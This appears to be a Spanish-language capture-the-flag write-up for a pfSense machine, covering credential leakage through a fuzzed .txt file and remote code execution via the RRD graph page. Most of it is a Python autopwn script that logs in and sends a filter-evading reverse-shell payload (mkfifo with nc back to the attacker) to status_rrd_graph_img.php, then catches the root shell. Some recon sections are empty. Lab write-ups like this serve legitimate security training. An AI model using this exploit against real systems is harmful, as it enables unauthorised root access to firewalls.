---------
- Tags: #python-scripting #pfsense #information-leakage
---------
## Tecnicas utilizadas
- Information Leakage  
- PFsense - Abusing RRD Graphs (RCE) [Evasion Techniques]  
- Python Exploit Development (AutoPwn) [EXTRA]
## Procedimiento

![[Pasted image 20230615120759.png]]

#### Reconocimiento

El escaneo de nmap nos da los siguientes puertos:


Si hacemos un whatweb contra la pagina podemos ver las tecnologias que corren por detres:

#### Information Leakage  

Visitando la pagina, vemos que es un CMS de nombre **Sense**. Si tratamos de fuzzear por archivos con terminacion *.txt* podemos encontrar un archivo interesante que contiene credenciales para acceder al CMS.

-------------
#### PFsense - Abusing RRD Graphs (RCE) [Evasion Techniques]  

Una vez con la credencial, se filtra la versión y con esta podemos buscar por exploits mas especificos. Hay uno que automatiza la explotacion y nos da una revershell shell como root.

------------------
#### Python Exploit Development (AutoPwn) [EXTRA]

Podemos automatizar completamente la intrusion a la maquina con el siguiente script

```python

from pwn import *
import pdb, requests, signal, sys, urllib3, time, re, threading

def def_handler(sig,frame):
	print("\n[!] Saliendo...")
	sys.exit(1)

# ctrl + c
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "https://<ip>/index.php"
rce_url = """https//<ip>/status_rrd_graph_img.php?database=queues;guion=$(printf "\\055");ampersand=$(printf "\\046");rm ${HOME}tmp${HOME}f;mkfifo ${HOME}tmp${HOME}f;cat ${HOME}tmp${HOME}f|${HOME}bin${HOME}sh ${guion}i 2>${ampersand}1|nc ip port >${HOME}tmp${HOME}f"""
lport = 443
def executeCommand():

	#crea una sesion
	s = requests.session()
	#deshabilita el warining del certificado autofirmado -> https
	urllib3.disable_warnings() 
	s.verify = False

	#tramita una peticion
	r = s.get(main_url)

	#obtenemos el csrfToken con una expresion regular
	csrfToken = re.findall(r'<cadena>', r.text)[0]

	#definimos la data que vamos a tramitar
	post_data = {
		'<data>':'<data>'
	}
	#mandamos la data, con la cual nos vamos a loguear
	r = s.post(main_url, data=post_data)
	#atentamos contra el RCE
	r = s.get(rce_url)
	

if __name__ == "__main__":

	try:
		# declaramos la funcion que necesitamos paralelizar
		threading.Thread(target=executeCommand, args=()).start()
	except Exception as e:
		#mostramos el error en formato string con pwntools
		log.error(str(e))

	#nos ponemos en escucha, de manera paralela, se ejecuta la funcion de arriba.
	shell = listen(lport, timeout=20).wait_for_connection()
	#invocamos una shell interactiva
	shell.interactive()
	
```

